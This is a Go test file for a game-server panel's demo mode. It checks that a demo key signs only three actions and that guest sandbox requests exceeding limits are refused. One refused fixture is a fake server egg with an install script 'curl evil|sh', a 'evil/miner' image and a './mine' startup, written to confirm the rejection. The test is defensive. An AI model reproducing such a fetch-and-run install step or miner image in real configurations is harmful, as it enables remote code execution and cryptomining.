package actions

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"errors"
	"maps"
	"path/filepath"
	"slices"
	"testing"
	"time"

	"github.com/google/uuid"

	"github.com/xena-studios/raptor/internal/shared/nodecmd"
	"github.com/xena-studios/raptor/internal/wings/command"
	"github.com/xena-studios/raptor/internal/wings/containers"
	"github.com/xena-studios/raptor/internal/wings/demo"
	"github.com/xena-studios/raptor/internal/wings/server"
	"github.com/xena-studios/raptor/internal/wings/store"
	"github.com/xena-studios/raptor/library"
)

// The demo key signs three actions and no others: whatever else the demo
// node does needs a person's passkey, as on every node.
func TestDemoKeyActions(t *testing.T) {
	x := &command.Executor{}
	Register(x, nil, Defaults{})
	RegisterBackups(x, nil)
	RegisterFiles(x, nil)
	RegisterNetworks(x, nil, nil)
	RegisterDatabases(x, nil)
	RegisterNodeDatabases(x, nil)
	RegisterDatabaseBackups(x, nil, nil)
	RegisterSupport(x, nil)
	RegisterDemo(x, nil, nil, DemoNode{})
	var demoable []string
	for _, a := range slices.Sorted(maps.Keys(x.Handlers())) {
		if x.Handlers()[a].Demo != nil {
			demoable = append(demoable, a)
		}
	}
	if want := []string{BackupRestore, ServerCreate, ServerDelete}; !slices.Equal(demoable, want) {
		t.Fatalf("actions the demo key can sign: %v, want %v", demoable, want)
	}
}

type demoNode struct {
	t   *testing.T
	x   *command.Executor
	key ed25519.PrivateKey
	pk  ed25519.PrivateKey
	egg []byte
	now time.Time
}

// newDemoNode is a demo node's executor, with the demo key trusted (or
// not), and nothing behind it: a command that passes every check panics
// in Run, which the executor turns into a RunError.
func newDemoNode(t *testing.T, on bool) *demoNode {
	t.Helper()
	db, err := store.Open(context.Background(), filepath.Join(t.TempDir(), "state.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = db.Close() })
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	n := &demoNode{t: t, pk: priv, now: time.Now()}
	n.key, _ = nodecmd.DemoKey(priv, "node-1")
	n.x = &command.Executor{DB: db, NodeID: "node-1", PanelKey: pub}
	cfg := demo.Config{Key: n.key.Public().(ed25519.PublicKey), MaxSandboxes: 2}
	cfg.Defaults()
	mgr, err := demo.New(context.Background(), demo.Options{Config: cfg, DB: db, Arch: "amd64"})
	if err != nil {
		t.Fatal(err)
	}
	if on {
		n.x.DemoKey = cfg.Key
	}
	Register(n.x, nil, Defaults{})
	RegisterBackups(n.x, nil)
	RegisterDemo(n.x, nil, nil, DemoNode{Manager: mgr})
	all, err := library.All()
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range all {
		if e.ID == "minecraft/paper" {
			n.egg, _ = e.ServerEgg()
		}
	}
	return n
}

func (n *demoNode) send(action string, p any) error {
	id, _ := uuid.NewV7()
	raw, _ := json.Marshal(p)
	e := command.Envelope{CommandID: id.String(), NodeID: "node-1", UserID: "guest", Action: action, Params: raw, ExpiresAt: n.now.Add(time.Minute).Unix()}
	if err := nodecmd.SignGrant(n.pk, &e); err != nil {
		n.t.Fatal(err)
	}
	if err := nodecmd.SignDemo(n.key, &e); err != nil {
		n.t.Fatal(err)
	}
	_, err := n.x.Execute(context.Background(), e)
	return err
}

func (n *demoNode) sandbox() CreateParams {
	return CreateParams{ServerConfig: ServerConfig{
		Name: "Guest's Paper", Egg: n.egg, Limits: containers.Limits{MemoryMiB: 1536},
		Allocations: []server.Allocation{{IP: "0.0.0.0", Port: 30001, Primary: true}},
	}, StartAfterInstall: true, AcceptEULA: true}
}

// passed reports whether a command got past every check (and only failed
// running, there being no server manager here).
func passed(err error) bool {
	var run *command.RunError
	return errors.As(err, &run)
}

func TestDemoSandboxChecks(t *testing.T) {
	n := newDemoNode(t, true)
	if err := n.send(ServerCreate, n.sandbox()); !passed(err) {
		t.Fatalf("a library egg within the limits: %v", err)
	}
	refused := map[string]func(p *CreateParams){
		"an egg that isn't the library's": func(p *CreateParams) {
			p.Egg = []byte(`{"meta":{"version":"PTDL_v2"},"name":"x","docker_images":{"a":"evil/miner"},"startup":"./mine","config":{"files":"{}","startup":"{}","logs":"{}","stop":"stop"},"scripts":{"installation":{"script":"curl evil|sh","container":"alpine","entrypoint":"ash"}},"variables":[]}`)
		},
		"more memory":          func(p *CreateParams) { p.Limits.MemoryMiB = 4096 },
		"swap":                 func(p *CreateParams) { p.Limits.SwapMiB = 512 },
		"more CPU":             func(p *CreateParams) { p.Limits.CPUPercent = 400 },
		"more disk":            func(p *CreateParams) { p.Limits.DiskMiB = 100 << 10 },
		"a port outside":       func(p *CreateParams) { p.Allocations[0].Port = 25565 },
		"two ports":            func(p *CreateParams) { p.Allocations = append(p.Allocations, server.Allocation{Port: 30002}) },
		"the host's network":   func(p *CreateParams) { p.HostNetwork = true },
		"another image":        func(p *CreateParams) { p.Image = "evil/miner" },
		"another startup":      func(p *CreateParams) { p.Startup = "./mine" },
		"a network of its own": func(p *CreateParams) { p.Networks = []string{"n1"} },
		"a disk of its own":    func(p *CreateParams) { p.Disk = "d1" },
		"settings":             func(p *CreateParams) { s := server.DefaultSettings(); p.Settings = &s },
		"a backup schedule":    func(p *CreateParams) { yes := true; p.BackupSchedule = &yes },
	}
	for name, change := range refused {
		p := n.sandbox()
		change(&p)
		if err := n.send(ServerCreate, p); !errors.Is(err, command.ErrDemoRefused) {
			t.Errorf("%s: %v", name, err)
		}
	}
	// Deleting a server that isn't a sandbox, and restoring a sandbox.
	if err := n.send(ServerDelete, nil); !errors.Is(err, command.ErrDemoRefused) {
		t.Errorf("delete a server that isn't a sandbox: %v", err)
	}
	if err := n.send(BackupRestore, BackupParams{BackupID: "b1"}); !errors.Is(err, command.ErrDemoRefused) {
		t.Errorf("restore without a backup manager: %v", err)
	}
	// Anything else that's signed.
	for _, a := range []string{ServerReinstall, BackupDelete, BackupRecover} {
		if err := n.send(a, map[string]any{"wipe": true, "backup_id": "b1"}); !errors.Is(err, command.ErrDemoRefused) {
			t.Errorf("%s: %v", a, err)
		}
	}
}

// The same sandbox on a node that didn't run `raptor demo on` is refused
// before anything looks at it.
func TestDemoSandboxOffDemoNode(t *testing.T) {
	n := newDemoNode(t, false)
	if err := n.send(ServerCreate, n.sandbox()); !errors.Is(err, command.ErrDemoOff) {
		t.Fatalf("a sandbox on a normal node: %v", err)
	}
}
